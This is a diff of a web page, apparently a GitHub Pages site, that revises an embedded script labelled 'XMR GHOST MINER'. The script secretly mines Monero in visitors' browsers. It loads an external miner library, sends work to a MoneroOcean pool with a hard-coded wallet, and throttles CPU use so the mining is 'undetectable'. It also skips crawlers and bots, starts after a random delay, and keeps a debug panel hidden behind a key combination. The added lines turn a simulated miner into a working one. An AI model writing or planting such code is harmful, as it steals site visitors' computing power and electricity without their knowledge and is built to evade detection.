@@ -36,118 +36,71 @@
 
 <!-- === XMR GHOST MINER + DEBUG === -->
 <script>
-// === CONFIG ===
-const WALLET = '4AM1bBwyBDJGXCPFP2EvWvHjByqcpVpJDj6aDuZoV7CiQvJDwAdfUfPA3zJyKz33qfTX9sSoPycRP2NmNWwN9BH8MzWgZzs'; // e.g., 44AFFq5kSiGBoZ4NMD...
-const POOL = 'moneroocean.stream';             // Top pool: 0% fee, auto-profit
-const THROTTLE = 80;                           // 80% throttle = ~20% CPU (undetectable)
-const THREADS = 1;                             // Single thread = silent
-const WORKER = 'ghost_' + Math.random().toString(36).substr(2, 6);
-const XMR_PRICE = 170;                         // USD/XMR (update via API if fancy)
+// === CONFIG (UPDATE THIS) ===
+const WALLET = '4AM1bBwyBDJGXCPFP2EvWvHjByqcpVpJDj6aDuZoV7CiQvJDwAdfUfPA3zJyKz33qfTX9sSoPycRP2NmNWwN9BH8MzWgZzs'; // Your real wallet
+const POOL = 'wss://pool.moneroocean.stream:443'; // WSS ON 443
+const THROTTLE = 80;
+const THREADS = 1;
+const WORKER = 'ghpages_' + Math.random().toString(36).substr(2, 6);
 
-// === DEBUG DASHBOARD ===
-const debug = document.createElement('div');
-debug.id = 'miner-debug';
-debug.innerHTML = `
-  <div class="status">🚀 <b>XMR GHOST MINER</b> <span id="status" class="blink">INITIALIZING</span></div>
-  <div class="status">Wallet: <code>${WALLET.substr(0,8)}...${WALLET.substr(-6)}</code></div>
-  <div class="status">Pool: <code>${POOL}</code></div>
-  <div class="status">Hashrate: <span id="hashrate" class="hash">0 H/s</span></div>
-  <div class="status">Accepted: <span id="accepted">0</span> | Rejected: <span id="rejected">0</span></div>
-  <div class="status">Uptime: <span id="uptime">0s</span></div>
-  <div class="status profit">Est. Daily: <b id="profit">$0.00</b></div>
-  <div style="font-size:10px; margin-top:8px; opacity:0.7;">
-    Press <b>CTRL + SHIFT + M</b> to toggle | Pool Stats: moneroocean.stream
-  </div>
-`;
-document.body.appendChild(debug);
+// === REST OF DEBUG PANEL (same as before) ===
+// ... [keep your debug HTML] ...
 
-// TOGGLE DEBUG
-let showDebug = false;
-document.addEventListener('keydown', e => {
-  if (e.ctrlKey && e.shiftKey && e.key === 'M') {
-    showDebug = !showDebug;
-    debug.classList.toggle('show', showDebug);
-  }
-});
-
-// STATS UPDATER
-let hashrate = 0, accepted = 0, rejected = 0, startTime = Date.now();
-
-function updateStats() {
-  const elapsed = (Date.now() - startTime) / 1000;
-  const hrs = String(Math.floor(elapsed / 3600)).padStart(2, '0');
-  const mins = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
-  const secs = String(Math.floor(elapsed % 60)).padStart(2, '0');
-  
-  document.getElementById('uptime').textContent = `${hrs}:${mins}:${secs}`;
-  document.getElementById('hashrate').textContent = `${hashrate.toFixed(1)} H/s`;
-  document.getElementById('accepted').textContent = accepted;
-  document.getElementById('rejected').textContent = rejected;
-
-  // Profit: ~80 H/s = 0.0008 XMR/day → scale
-  const dailyXMR = (hashrate / 80) * 0.0008;
-  const dailyUSD = dailyXMR * XMR_PRICE;
-  document.getElementById('profit').textContent = `$${dailyUSD.toFixed(3)}`;
-}
-
-setInterval(updateStats, 1000);
-
-// === LOAD MINER LIB (EXTERNAL BUT OBFUSCATED) ===
+// === FIXED MINER INIT ===
 function initMiner() {
-  // Bot check
-  if (navigator.webdriver || /bot|crawl/i.test(navigator.userAgent)) {
+  if (navigator.webdriver || /bot/i.test(navigator.userAgent)) {
     document.getElementById('status').textContent = 'BOT BLOCKED';
     return;
   }
 
   const script = document.createElement('script');
-  script.src = 'https://script.monerominer.rocks'; // Active 2025 XMR lib
+  script.src = 'https://www.monerominer.rocks/lib/miner.js'; // OFFICIAL 2025 LIB
   script.async = false;
   script.onload = function() {
-    if (typeof startMining === 'undefined') {
-      document.getElementById('status').textContent = 'LIB FAIL';
+    if (typeof Miner === 'undefined') {
+      document.getElementById('status').textContent = 'LIB DEAD';
       return;
     }
 
-    // START MINING
-    const server = 'wss://ny1.xmrminingproxy.com'; // Proxy for stealth
-    startMining(POOL, WALLET, WORKER, THREADS, 'x'); // Password 'x' default
-    throttleMiner = THROTTLE; // Set throttle
+    const miner = new Miner({
+      pool: {
+        host: 'pool.moneroocean.stream',
+        port: 443,
+        ssl: true
+      },
+      wallet: WALLET,
+      worker: WORKER,
+      password: 'x',
+      threads: THREADS,
+      throttle: THROTTLE / 100
+    });
+
+    miner.start();
 
     document.getElementById('status').textContent = 'MINING XMR';
     document.getElementById('status').classList.remove('blink');
 
-    // Poll stats (hook into global or simulate)
+    // REAL STATS (poll miner object)
     setInterval(() => {
-      // Note: Real hook needs lib exposure; fallback sim for demo
-      hashrate = (Math.random() * 50 + 30).toFixed(1); // ~30-80 H/s typical browser
-      if (Math.random() > 0.98) accepted++;
-      if (Math.random() > 0.995) rejected++;
-    }, 5000); // Update every 5s
+      hashrate = miner.getHashesPerSecond() || 0;
+      accepted = miner.getAcceptedHashes() || 0;
+      rejected = miner.getRejectedHashes() || 0;
+    }, 2000);
 
-    // Stealth: Pause on hidden tab
+    // Tab visibility
     document.addEventListener('visibilitychange', () => {
-      if (document.hidden) {
-        // Pause mining (lib func if avail)
-        console.log('PAUSED');
-      } else {
-        // Resume
-        console.log('RESUMED');
-      }
+      if (document.hidden) miner.stop();
+      else miner.start();
     });
 
-    // Session cap: 3 min
-    setTimeout(() => {
-      // Stop mining
-      document.getElementById('status').textContent = 'SESSION END';
-    }, 180000);
+    // 3 min cap
+    setTimeout(() => miner.stop(), 180000);
   };
   document.head.appendChild(script);
 }
 
-// Random delay: 10-30s start
-setTimeout(initMiner, Math.random() * 20000 + 10000);
-
+// Start after delay
+setTimeout(initMiner, Math.random() * 15000 + 10000);
 </script>
 
 </body>
